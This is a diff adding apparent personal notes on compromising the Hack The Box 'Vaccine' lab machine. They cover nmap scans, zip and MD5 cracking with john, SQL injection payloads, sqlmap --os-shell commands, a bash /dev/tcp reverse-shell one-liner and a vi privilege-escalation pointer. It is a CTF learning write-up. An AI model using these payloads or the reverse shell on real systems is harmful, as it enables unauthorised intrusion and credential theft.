@@ -1,0 +1,129 @@
+Running an nmap scan
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.28 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 
+nmap -sC -sV -p$ports 10.10.10.46
+-------------------------------------------------------------
+
+PORT      STATE  SERVICE VERSION
+22/tcp    open   ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
+|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
+|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
+80/tcp    open   http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: MegaCorp Login
+25269/tcp closed unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Got a weird result redid the nmap scan got an ftp server as well
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
+|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
+|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: MegaCorp Login
+
+
+--------------------------------------------------------------------------------
+
+GET / HTTP/1.1
+Host: 10.10.10.46
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=hquahc6hjjv4gi1danuunktaac
+Upgrade-Insecure-Requests: 1
+
+-------------------------------------------
+The apache server was just a login old logins from Archetype and Oopsie didnt seem to work
+The form has action as "" seems like a dead Encoding
+
+----------------------------------------------------------------
+
+Ran Nikto and dirbuster simaltaneously for enumeration
+dirbuster
+http://10.10.10.46/index.php (CODE:200|SIZE:2312)                                                                                                                  
++ http://10.10.10.46/server-status (CODE:403|SIZE:276)
+----------------------------------------
+Now that there is an ftp server will try to login using the credentials from Oopsie
+There was one file called backup.zip
+It contains a php file and a css file 
+It is password protected however
+Tried the ftp password didnt work will try the Archetype admin password
+Using john the ripper to crack It
+sudo zip2john backup.zip>output
+sudo john output -w= /usr/share/wordlists/rockyou.txt
+741852963
+is the password for thezip file
+-----------------------------------------------------
+session_start();
+  if(isset($_POST['username']) && isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+      $_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+    }
+  }
+?>
+-----------------------------------
+Using these credentials for the website
+need to get the normal of that md5
+sudo john --format=raw-md5 md5
+md5 is a file where i pasted the md5 of the password
+Did an online md5 decrypter instantly got it while john was Running
+qwerty789
+-------------------------------------------
+This opens the dashboard a search bar and a table
+http://10.10.10.46/dashboard.php?search=%27+OR+1%3D1+--
+shows that the system is sqli exploitable
+'OR 1=1;SELECT * FROM information_schema.tables --
+works implies it is postgre sql
+
+https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/
+
+sqlmap http://10.10.10.46/dashboard.php?search=f --cookie="PHPSESSID=hquahc6hjjv4gi1danuunktaac"
+sqlmap http://10.10.10.46/dashboard.php?search=f --cookie="PHPSESSID=hquahc6hjjv4gi1danuunktaac"  --tables
+to get the tables
+--priveleges
+database management system users privileges:
+[*] postgres (administrator) [2]:
+    privilege: createdb
+    privilege: super
+
+sqlmap http://10.10.10.46/dashboard.php?search=f --cookie="PHPSESSID=hquahc6hjjv4gi1danuunktaac"  --os-shell
+ will give the shell
+ Didnt give the shell becuase session expired
+ hquahc6hjjv4gi1danuunktaac
+ There was some error so instead used 
+ https://github.com/florianges/-HTB-Vaccine_sql_injection.git found on the forums
+
+bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
+this is making an interactive shell redirecting stdin and stdout to my ip with an nc at teh appropriate port Running
+
+
+Upgrading to a tty shell
+SHELL=/bin/bash script -q /dev/null
+
+
+  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+  This is for sudo access
+
+
+
+
+  https://medium.com/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e
+  This is a good resource for understanding how we used vi to get root access
+
